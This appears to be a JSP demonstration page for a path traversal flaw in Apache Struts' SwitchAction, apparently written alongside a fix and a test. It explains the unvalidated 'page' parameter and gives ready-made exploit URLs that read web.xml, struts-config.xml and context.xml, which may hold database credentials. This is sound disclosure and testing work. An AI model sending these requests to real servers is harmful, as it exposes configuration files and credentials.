<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<head>
  <title>SwitchAction Path Traversal Demo (C-1)</title>
  <style>
    body { font-family: monospace; max-width: 800px; margin: 2em auto; }
    h1 { font-size: 1.4em; }
    h2 { font-size: 1.1em; margin-top: 2em; }
    .safe { background: #e8f5e9; border: 1px solid #4caf50; padding: 1em; margin: 0.5em 0; }
    .danger { background: #ffebee; border: 1px solid #f44336; padding: 1em; margin: 0.5em 0; }
    code { background: #f5f5f5; padding: 0.2em 0.4em; }
    a { color: #1565c0; }
    pre { background: #263238; color: #eeffff; padding: 1em; overflow-x: auto; }
  </style>
</head>
<body>

<h1>SwitchAction Path Traversal Demo (C-1)</h1>

<p>
  This example demonstrates the path traversal vulnerability in
  <code>org.apache.struts.actions.SwitchAction</code>.
  SwitchAction reads the <code>page</code> parameter directly from the HTTP
  request and passes it to <code>new ActionForward(page)</code> without any
  validation. The resulting forward is dispatched via
  <code>RequestDispatcher.forward()</code>, allowing an attacker to read
  arbitrary server-side resources.
</p>

<!-- ============================================================ -->
<h2>1. Legitimate Usage</h2>
<!-- ============================================================ -->

<div class="safe">
  <p>Switch to module1 and forward to <code>/hello.do</code>:</p>
  <a href="switch.do?prefix=/module1&page=/hello.do">
    switch.do?prefix=/module1&amp;page=/hello.do
  </a>
</div>

<div class="safe">
  <p>Switch to module2 and forward to <code>/hello.do</code>:</p>
  <a href="switch.do?prefix=/module2&page=/hello.do">
    switch.do?prefix=/module2&amp;page=/hello.do
  </a>
</div>

<!-- ============================================================ -->
<h2>2. Path Traversal: Read /WEB-INF/web.xml</h2>
<!-- ============================================================ -->

<div class="danger">
  <p>
    The <code>page</code> parameter points to <code>/WEB-INF/web.xml</code>.
    SwitchAction does not validate this value, so the servlet container
    will forward to the deployment descriptor and render its contents.
  </p>
  <a href="switch.do?prefix=&page=/WEB-INF/web.xml">
    switch.do?prefix=&amp;page=/WEB-INF/web.xml
  </a>
</div>

<!-- ============================================================ -->
<h2>3. Path Traversal: Read /WEB-INF/struts-config.xml</h2>
<!-- ============================================================ -->

<div class="danger">
  <p>
    Read the Struts configuration, which may reveal action mappings,
    form-bean types, data-source credentials, and plugin settings.
  </p>
  <a href="switch.do?prefix=&page=/WEB-INF/struts-config.xml">
    switch.do?prefix=&amp;page=/WEB-INF/struts-config.xml
  </a>
</div>

<!-- ============================================================ -->
<h2>4. Path Traversal: Read /META-INF/context.xml</h2>
<!-- ============================================================ -->

<div class="danger">
  <p>
    On Tomcat, <code>/META-INF/context.xml</code> may contain JNDI
    data-source definitions with database credentials.
  </p>
  <a href="switch.do?prefix=&page=/META-INF/context.xml">
    switch.do?prefix=&amp;page=/META-INF/context.xml
  </a>
</div>

<!-- ============================================================ -->
<h2>5. Parent-Directory Traversal</h2>
<!-- ============================================================ -->

<div class="danger">
  <p>
    Using <code>/../</code> sequences. Whether this works depends on the
    servlet container's <code>getRequestDispatcher()</code> implementation.
    Some containers normalize the path; others do not.
  </p>
  <a href="switch.do?prefix=&page=/../WEB-INF/web.xml">
    switch.do?prefix=&amp;page=/../WEB-INF/web.xml
  </a>
</div>

<!-- ============================================================ -->
<h2>Vulnerable Code</h2>
<!-- ============================================================ -->

<pre>
// SwitchAction.java lines 86-104
String page = request.getParameter("page");     // attacker-controlled
String prefix = request.getParameter("prefix"); // must be valid module

// ... prefix is validated against known modules ...

// page is passed directly to ActionForward -- NO validation
return (new ActionForward(page));

// RequestProcessor then calls:
//   getServletContext().getRequestDispatcher(uri).forward(req, res);
</pre>

<hr>
<p><small>
  See: TODO.md C-1, TestSwitchActionPathTraversal.java
</small></p>

</body>
</html>
